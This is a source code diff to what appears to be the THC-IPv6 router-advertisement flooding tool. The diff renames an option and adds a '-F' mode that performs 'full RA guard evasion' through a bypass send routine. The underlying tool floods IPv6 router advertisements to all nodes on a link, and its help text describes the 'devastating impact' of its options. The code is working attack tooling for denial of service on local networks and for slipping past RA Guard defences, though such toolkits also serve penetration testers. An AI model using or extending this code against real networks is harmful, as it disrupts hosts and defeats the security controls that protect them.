@@ -23,8 +23,9 @@ void help(char *prg) {
   printf("Options:\n");
   printf("  -a       add a hopbyhop header with router alert\n");
   printf("  -H       add a hopbyhop header to bypass RA guard security\n");
-  printf("  -F       add an atomic fragment header to bypass RA guard security\n");
+  printf("  -f       add an atomic fragment header to bypass RA guard security\n");
   printf("  -D       add a large destination header to bypass RA guard security\n");
+  printf("  -F       perform full RA guard evasion (disallows all other bypass options)\n");
   printf("  -s       use small lifetimes, resulting in a more devasting impact\n");
   printf("  -S       performs a slow start, which can increases the impact\n");
   printf("  -G       gigantic packet of 64kb of prefix/route entries\n");
@@ -39,14 +40,14 @@ int main(int argc, char *argv[]) {
   unsigned char *dst = thc_resolve6("ff02::1"), *dstmac = thc_get_multicast_mac(dst);
   int size, mtu, i, j, k, type = NXT_ICMP6, route_only = 0, prefix_only = 0, offset = 14;
   unsigned char *pkt = NULL;
-  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_alert = 0, do_hop = 0, do_frag = 0, do_dst = 0, bsize = -1, do_dhcp = 0;
+  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_alert = 0, do_hop = 0, do_frag = 0, do_dst = 0, bsize = -1, do_dhcp = 0, do_full = 0;
   int cnt, until = 0, lifetime = 0x00ff0100, mfoo, slow = 0, prefer = PREFER_LINK;
   thc_ipv6_hdr *hdr = NULL;
 
   if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
-  while ((i = getopt(argc, argv, "DFHRPAarsmSG")) >= 0) {
+  while ((i = getopt(argc, argv, "fDFHRPAarsmSG")) >= 0) {
     switch (i) {
     case 'r':
       thc_ipv6_rawmode(1);
@@ -70,8 +71,11 @@ int main(int argc, char *argv[]) {
       cnt = 5;
       until = 256;
       break;
-    case 'F':
+    case 'f':
       do_frag++;
+      break;
+    case 'F':
+      do_full = 1;
       break;
     case 'H':
       do_hop = 1;
@@ -94,6 +98,9 @@ int main(int argc, char *argv[]) {
       exit(-1);
     }
   }
+
+  if (do_full) 
+    do_frag = do_alert = do_hop = do_dst = 0;
   
   interface = argv[optind];
   
@@ -280,9 +287,11 @@ int main(int argc, char *argv[]) {
       mfoo = (mfoo | (do_dhcp << 16));
     if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, mfoo, buf, j, 0) < 0)
       return -1;
-    if (do_dst || bsize + 40 > thc_get_mtu(interface)) {
+    if (do_full) {
       thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
       hdr = (thc_ipv6_hdr *) pkt;
+      thc_send_raguard_bypass6(interface, ip6, dst, mac6, dstmac, NXT_ICMP6, hdr->pkt + 40 + offset, hdr->pkt_len - 40 - offset, 0);
+    } else  if (do_dst || bsize + 40 > thc_get_mtu(interface)) {
       thc_send_as_fragment6(interface, ip6, dst, type, hdr->pkt + 40 + offset, hdr->pkt_len - 40 - offset, 1240);
     } else {
       if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) {
